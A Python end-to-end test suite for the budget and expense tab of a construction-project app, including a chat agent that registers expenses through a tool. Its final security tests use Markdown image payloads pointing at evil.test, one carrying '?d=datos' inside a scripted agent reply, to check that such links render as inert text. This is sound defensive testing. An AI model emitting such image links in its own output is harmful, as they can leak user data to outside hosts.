"""F-03 · Presupuesto y gastos, end to end through the real app.

One test (or more) per acceptance criterion; IDs match the ficha and
docs/casos-e2e.md. External services are simulated (see conftest.py).
"""

import re
from datetime import timedelta

from langchain_core.messages import AIMessage

from atrium import finanzas, obras
from tests.e2e.conftest import click, texts
from tests.fakes import tool_call

PLATA = 3  # index of the «💰 Plata» tab inside 📋 Obras


def _obra(e2e, nombre="Casa Lote 12", **extra):
    return obras.create_obra(e2e.db, {"nombre": nombre, "municipio": "La Plata", **extra})


def _rubro(e2e, nombre):
    return finanzas.find_rubros(e2e.db, nombre)[0]["id"]


def _plata(e2e, obra_id=1):
    at = e2e.go_to_obras(e2e.login())
    return at.selectbox(key="plata_obra").set_value(obra_id).run()


def visible(at) -> str:
    """Page text as the user reads it (Markdown escapes removed)."""

    return re.sub(r"\\(.)", r"\1", texts(at))


def _metricas(at):
    return {m.label: m.value for m in at.tabs[PLATA].metric}


def _tabla(at):
    """The per-rubro table of the Plata tab, indexed by rubro."""

    return at.tabs[PLATA].dataframe[0].value.set_index("Rubro")


def _cargar_gasto(at, monto, descripcion, rubro_id, moneda="ARS", **mas):
    at.number_input(key="gasto_monto").set_value(monto)
    at.selectbox(key="gasto_moneda").set_value(moneda)
    at.selectbox(key="gasto_rubro").set_value(rubro_id)
    at.text_input(key="gasto_descripcion").input(descripcion)
    if "fecha" in mas:
        at.date_input(key="gasto_fecha").set_value(mas["fecha"])
    if "proveedor" in mas:
        at.text_input(key="gasto_proveedor").input(mas["proveedor"])
    return click(at, "Guardar gasto")


def _seed_gasto(e2e, monto, moneda, rubro, tipo_cambio=None, **mas):
    """Insert a gasto directly (bypassing the UI) with a fixed rate or none."""

    fila = {
        "obra_id": 1,
        "fecha": finanzas.hoy().isoformat(),
        "monto": str(monto),
        "moneda": moneda,
        "rubro_id": _rubro(e2e, rubro),
        "descripcion": mas.get("descripcion", "Gasto de prueba"),
    }
    if tipo_cambio:
        fila.update(tipo_cambio=str(tipo_cambio), tipo_cambio_origen="auto")
    return e2e.db.table("gastos").insert(fila).execute().data[0]


# --------------------------------------------------------------------------- #
# Presupuesto
# --------------------------------------------------------------------------- #


# --------------------------------------------------------------------------- #
# Gastos
# --------------------------------------------------------------------------- #
def test_f03_ca_2_registrar_gasto_suma_en_rubro_y_total(e2e):
    """F-03-CA-2: el gasto aparece en «Últimos gastos» y suma en su rubro y total."""

    _obra(e2e)
    finanzas.add_presupuesto_item(
        e2e.db, 1, monto=1_000_000, moneda="ARS", rubro_id=_rubro(e2e, "Estructura")
    )
    at = _cargar_gasto(
        _plata(e2e), 350_000.0, "Hierro del 8", _rubro(e2e, "Estructura"), proveedor="Hierros Sur"
    )

    assert not at.exception
    pantalla = texts(at)
    assert "Gasto guardado: ARS 350.000" in visible(at)
    assert "Hierro del 8" in pantalla and "Hierros Sur" in pantalla
    assert _tabla(at).loc["Estructura", "Gastado"] == "ARS 350.000"
    assert _metricas(at)["Gastado"] == "ARS 350.000"
    assert _metricas(at)["Desvío"] == "−ARS 650.000"
    assert "Dentro del presupuesto" in pantalla
    assert at.text_input(key="gasto_descripcion").value == ""  # formulario limpio


def test_f03_ca_3_cotizacion_automatica_del_dia(e2e):
    """F-03-CA-3: MEP compra 1190 / venta 1210 -> se guarda 1200 automático."""

    _obra(e2e)
    e2e.set_mep({finanzas.hoy(): (1190, 1210)})
    at = _cargar_gasto(_plata(e2e), 100.0, "Visita técnica", _rubro(e2e, "Honorarios"), "USD")

    gasto = finanzas.list_gastos(e2e.db, 1)[0]
    assert (gasto["tipo_cambio"], gasto["tipo_cambio_origen"]) == ("1200.0000", "auto")
    assert "MEP 1.200,00 (automática)" in visible(at)


def test_f03_ca_4_sabado_usa_cotizacion_del_viernes(e2e):
    """F-03-CA-4: un gasto de un sábado toma la cotización del viernes anterior."""

    hoy = finanzas.hoy()
    sabado = hoy - timedelta(days=(hoy.weekday() - 5) % 7)
    viernes = sabado - timedelta(days=1)
    e2e.set_mep({viernes: (1180, 1200), viernes - timedelta(days=1): (1000, 1000)})
    _obra(e2e)

    at = _cargar_gasto(_plata(e2e), 50_000.0, "Arena", _rubro(e2e, "Mampostería"), fecha=sabado)

    assert not at.exception
    gasto = finanzas.list_gastos(e2e.db, 1)[0]
    assert gasto["fecha"] == sabado.isoformat()
    assert gasto["tipo_cambio"] == "1190.0000"


def test_f03_ca_5_fuente_caida_guarda_sin_cotizacion(e2e):
    """F-03-CA-5: sin servicio de cotizaciones el gasto se guarda, con aviso, y se
    puede cargar la cotización a mano."""

    _obra(e2e)
    e2e.mep_caido = True
    at = _cargar_gasto(_plata(e2e), 80_000.0, "Cemento", _rubro(e2e, "Fundaciones"))

    assert not at.exception
    gasto = finanzas.list_gastos(e2e.db, 1)[0]
    assert "tipo_cambio" not in gasto
    pantalla = texts(at)
    assert "No se pudo consultar el dólar MEP" in visible(at)
    assert "sin cotización" in pantalla
    assert any(b.label == "Guardar cotización" for b in at.button)


def test_f03_ca_6_corregir_cotizacion_a_mano(e2e):
    """F-03-CA-6: la cotización corregida queda manual, se marca y se usa en el resumen."""

    _obra(e2e)
    _seed_gasto(e2e, 1000, "USD", "Honorarios", tipo_cambio=1200)
    at = _plata(e2e)
    at.number_input(key="tc_gasto_valor").set_value(1180.0)
    at = click(at, "Guardar cotización")

    assert not at.exception
    gasto = finanzas.list_gastos(e2e.db, 1)[0]
    assert (gasto["tipo_cambio"], gasto["tipo_cambio_origen"]) == ("1180.0000", "manual")
    assert "MEP 1.180,00 (corregida a mano)" in visible(at)
    assert _metricas(at)["Gastado"] == "ARS 1.180.000"


# --------------------------------------------------------------------------- #
# Resumen y monedas
# --------------------------------------------------------------------------- #
def test_f03_ca_7_resumen_en_pesos_y_en_dolares(e2e):
    """F-03-CA-7: USD 1.000 y ARS 600.000 a 1200 -> ARS 1.800.000 o USD 1.500."""

    _obra(e2e)
    _seed_gasto(e2e, 1000, "USD", "Honorarios", tipo_cambio=1200)
    _seed_gasto(e2e, 600000, "ARS", "Estructura", tipo_cambio=1200)
    at = _plata(e2e)
    assert _metricas(at)["Gastado"] == "ARS 1.800.000"

    at = at.radio(key="plata_moneda").set_value("USD").run()
    assert _metricas(at)["Gastado"] == "USD 1.500"
    assert _tabla(at).loc["Estructura", "Gastado"] == "USD 500"


def test_f03_ca_8_sin_cotizacion_total_incompleto(e2e):
    """F-03-CA-8: un gasto en USD sin cotización no suma en ARS y hay aviso."""

    _obra(e2e)
    _seed_gasto(e2e, 1000, "USD", "Honorarios")
    _seed_gasto(e2e, 600000, "ARS", "Estructura")
    at = _plata(e2e)

    assert _metricas(at)["Gastado"] == "ARS 600.000"
    assert "Total incompleto: 1 registro(s) sin cotización" in texts(at)


def test_f03_ca_9_anular_gasto(e2e):
    """F-03-CA-9: anular pide confirmación; el gasto deja de sumar, se ve tachado y
    no se borra."""

    _obra(e2e)
    gasto = _seed_gasto(e2e, 350000, "ARS", "Estructura", tipo_cambio=1200, descripcion="Hierro")
    at = _plata(e2e)

    at = click(at, "Anular gasto")
    assert "Marcá la confirmación" in texts(at)
    assert finanzas.list_gastos(e2e.db, 1)[0]["anulado"] is False

    at.checkbox(key=f"anular_gasto_ok_{gasto['id']}").check()
    at = click(at, "Anular gasto")

    assert not at.exception
    gasto = finanzas.list_gastos(e2e.db, 1)[0]
    assert gasto["anulado"] is True  # sigue en la base
    assert _metricas(at)["Gastado"] == "ARS 0"
    tachado = [m.value for m in at.tabs[PLATA].markdown if m.value.startswith("~~")]
    assert tachado and "Hierro" in tachado[0] and tachado[0].endswith("**Anulado**")


def test_f03_ca_10_datos_invalidos_no_se_guardan(e2e):
    """F-03-CA-10: monto 0 o sin descripción -> mensaje claro, nada guardado y el
    formulario conserva lo escrito."""

    _obra(e2e)
    at = _cargar_gasto(_plata(e2e), 0.0, "Cemento", _rubro(e2e, "Fundaciones"))
    assert "No se guardó el gasto: El monto tiene que ser mayor que cero." in visible(at)
    assert at.text_input(key="gasto_descripcion").value == "Cemento"

    at = _cargar_gasto(at, 1000.0, "   ", _rubro(e2e, "Fundaciones"))
    assert "No se guardó el gasto: Falta la descripción." in visible(at)
    assert finanzas.list_gastos(e2e.db, 1) == []


# --------------------------------------------------------------------------- #
# Agente
# --------------------------------------------------------------------------- #
def test_f03_ca_11_cargar_gasto_por_chat(e2e):
    """F-03-CA-11: «cargá 350 mil pesos de hierro» con obra activa -> gasto en
    Estructura con la cotización del día, aviso visible y se ve en 💰 Plata."""

    _obra(e2e)
    e2e.script(
        tool_call(
            "registrar_gasto",
            {"monto": 350000, "descripcion": "Hierro", "rubro": "Estructura", "moneda": "ARS"},
        ),
        AIMessage(content="Listo, cargué ARS 350.000 de hierro en Estructura."),
    )
    at = e2e.login()
    at.sidebar.selectbox[0].set_value(1).run()
    at = at.chat_input[0].set_value("Cargá 350 mil pesos de hierro").run()

    assert not at.exception
    assert "💸 Gasto registrado en «Casa Lote 12»: ARS 350.000 · Estructura" in texts(at)
    gasto = finanzas.list_gastos(e2e.db, 1)[0]
    assert gasto["tipo_cambio"] == "1200.0000" and gasto["tipo_cambio_origen"] == "auto"

    at = e2e.go_to_obras(at)
    assert _tabla(at).loc["Estructura", "Gastado"] == "ARS 350.000"


def test_f03_ca_11b_rubro_inexistente_no_escribe(e2e):
    """F-03-CA-11 (borde): con un rubro que no existe, el agente no guarda nada."""

    _obra(e2e)
    e2e.script(
        tool_call("registrar_gasto", {"monto": 1000, "descripcion": "x", "rubro": "Jardinería"}),
        AIMessage(content="¿En qué rubro lo cargo?"),
    )
    at = e2e.login()
    at.sidebar.selectbox[0].set_value(1).run()
    at.chat_input[0].set_value("Cargá 1000 de jardinería").run()

    assert "No hay un rubro «Jardinería»" in e2e.llm.seen[1][-1].content
    assert finanzas.list_gastos(e2e.db, 1) == []


def test_f03_ca_12_consultar_desvios_por_chat(e2e):
    """F-03-CA-12: «¿en qué rubro nos pasamos?» responde con datos reales."""

    _obra(e2e)
    for rubro, monto in (("Fundaciones", 1000), ("Estructura", 2000)):
        finanzas.add_presupuesto_item(
            e2e.db, 1, monto=monto, moneda="ARS", rubro_id=_rubro(e2e, rubro)
        )
    _seed_gasto(e2e, 1500, "ARS", "Fundaciones", tipo_cambio=1200)
    _seed_gasto(e2e, 500, "ARS", "Estructura", tipo_cambio=1200)
    e2e.script(
        tool_call("resumen_plata", {}),
        AIMessage(content="Nos pasamos en Fundaciones: ARS 500 por encima."),
    )
    at = e2e.login()
    at.sidebar.selectbox[0].set_value(1).run()
    at = at.chat_input[0].set_value("¿En qué rubro nos pasamos?").run()

    resultado = e2e.llm.seen[1][-1].content
    assert "Fundaciones: presupuestado ARS 1.000, gastado ARS 1.500" in resultado
    assert "(Excedido)" in resultado.split("Fundaciones")[1].split("\n")[0]
    assert "Estructura" in resultado and "(Dentro del presupuesto)" in resultado
    assert "Nos pasamos en Fundaciones" in texts(at)


# --------------------------------------------------------------------------- #
# Seguridad y accesibilidad de la pantalla
# --------------------------------------------------------------------------- #
def test_f03_seg_1_texto_de_usuario_no_se_interpreta(e2e):
    """F-03-SEG-1: una descripción con Markdown no puede mostrar imágenes ni links."""

    _obra(e2e)
    _seed_gasto(
        e2e, 100, "ARS", "Otros", tipo_cambio=1200, descripcion="![x](https://evil.test/p.png)"
    )
    at = _plata(e2e)

    crudos = "\n".join(m.value for m in at.tabs[PLATA].markdown)
    assert "![x](https://" not in crudos
    assert r"\!\[x\]\(https\://evil\.test/p\.png\)" in crudos


def test_f03_a11y_1_todos_los_campos_tienen_etiqueta(e2e):
    """F-03-A11Y-1: cada campo de la pestaña tiene una etiqueta visible y los
    obligatorios lo dicen."""

    _obra(e2e)
    _seed_gasto(e2e, 100, "ARS", "Otros", tipo_cambio=1200)
    at = _plata(e2e)
    tab = at.tabs[PLATA]

    campos = [
        *tab.number_input,
        *tab.text_input,
        *tab.selectbox,
        *tab.date_input,
        *tab.checkbox,
        *tab.radio,
    ]
    assert len(campos) >= 12
    for campo in campos:
        assert campo.label and campo.label.strip(), campo.key
    obligatorios = {c.key: c.label for c in campos if "obligatori" in c.label}
    assert {"gasto_monto", "gasto_rubro", "gasto_descripcion"} <= set(obligatorios)


def test_f03_a11y_2_estado_en_palabras(e2e):
    """F-03-A11Y-2: el desvío se informa con texto, no solo con color."""

    _obra(e2e)
    finanzas.add_presupuesto_item(
        e2e.db, 1, monto=100, moneda="ARS", rubro_id=_rubro(e2e, "Pintura")
    )
    _seed_gasto(e2e, 150, "ARS", "Pintura", tipo_cambio=1200)
    at = _plata(e2e)

    assert _tabla(at).loc["Pintura", "Estado"] == "Excedido"
    assert "🔴 Excedido" in texts(at)


def test_f03_ca_9b_confirmacion_no_pasa_a_otro_gasto(e2e):
    """F-03-CA-9 (revisión PR #5): confirmar un gasto y elegir otro no lo anula sin
    confirmar de nuevo."""

    _obra(e2e)
    a = _seed_gasto(e2e, 100, "ARS", "Pintura", tipo_cambio=1200, descripcion="Gasto A")
    b = _seed_gasto(e2e, 200, "ARS", "Pintura", tipo_cambio=1200, descripcion="Gasto B")
    at = _plata(e2e)

    at.selectbox(key="gasto_elegido").set_value(a["id"]).run()
    at.checkbox(key=f"anular_gasto_ok_{a['id']}").check().run()
    at.selectbox(key="gasto_elegido").set_value(b["id"]).run()
    assert at.checkbox(key=f"anular_gasto_ok_{b['id']}").value is False

    at = click(at, "Anular gasto")
    assert "Marcá la confirmación" in texts(at)
    assert not any(g["anulado"] for g in finanzas.list_gastos(e2e.db, 1))


def test_f03_ca_11c_rubro_ambiguo_pide_aclarar(e2e):
    """F-03-CA-11 (revisión PR #5): con un rubro ambiguo no se guarda nada y la
    herramienta exige preguntar al usuario."""

    _obra(e2e)
    e2e.script(
        tool_call(
            "registrar_gasto", {"monto": 1000, "descripcion": "Cables", "rubro": "Instalación"}
        ),
        AIMessage(content="¿Es instalación eléctrica, sanitaria o de gas?"),
    )
    at = e2e.login()
    at.sidebar.selectbox[0].set_value(1).run()
    at = at.chat_input[0].set_value("Cargá 1000 de instalación").run()

    resultado = e2e.llm.seen[1][-1].content
    assert "No registré el gasto" in resultado and "Preguntale al usuario" in resultado
    assert "Instalación eléctrica" in resultado and "Instalación de gas" in resultado
    assert finanzas.list_gastos(e2e.db, 1) == []
    assert "💸" not in texts(at)


def test_f03_seg_3_avisos_del_chat_escapan_nombres(e2e):
    """F-03-SEG-3 (revisión PR #5): los avisos de lo que guardó el agente no
    interpretan Markdown de nombres de obra o rubro, ni en la respuesta ni en el
    historial."""

    _obra(e2e, nombre="![o](https://evil.test/o.png)")
    e2e.db.table("rubros").insert({"nombre": "![r](https://evil.test/r.png)", "orden": 5}).execute()
    e2e.script(
        tool_call(
            "registrar_gasto",
            {"monto": 10, "descripcion": "x", "rubro": "![r](https://evil.test/r.png)"},
        ),
        AIMessage(content="Listo."),
    )
    at = e2e.login()
    at.sidebar.selectbox[0].set_value(1).run()
    at = at.chat_input[0].set_value("Cargá 10").run()

    avisos = [c.value for c in at.caption if "Gasto registrado" in c.value]
    assert avisos and all("](https://" not in a for a in avisos)
    assert len(finanzas.list_gastos(e2e.db, 1)) == 1

    at = at.run()  # siguiente carga: el aviso sale del historial de la sesión
    avisos = [c.value for c in at.caption if "Gasto registrado" in c.value]
    assert avisos and all("](https://" not in a for a in avisos)


def test_f03_seg_4_respuesta_del_agente_no_carga_imagenes(e2e):
    """F-03-SEG-4: si la respuesta del agente trae una imagen (por ejemplo, copiada
    de un dato malicioso), se muestra como texto, también en el historial."""

    _obra(e2e)
    e2e.script(AIMessage(content="Listo ![x](https://evil.test/p.png?d=datos) **ok**"))
    at = e2e.login().chat_input[0].set_value("hola").run()

    crudos = "\n".join(m.value for m in at.markdown)
    assert "\\![x](https://evil.test" in crudos and "**ok**" in crudos
    assert "Listo ![x]" not in crudos
    at = at.run()
    assert "Listo ![x]" not in "\n".join(m.value for m in at.markdown)
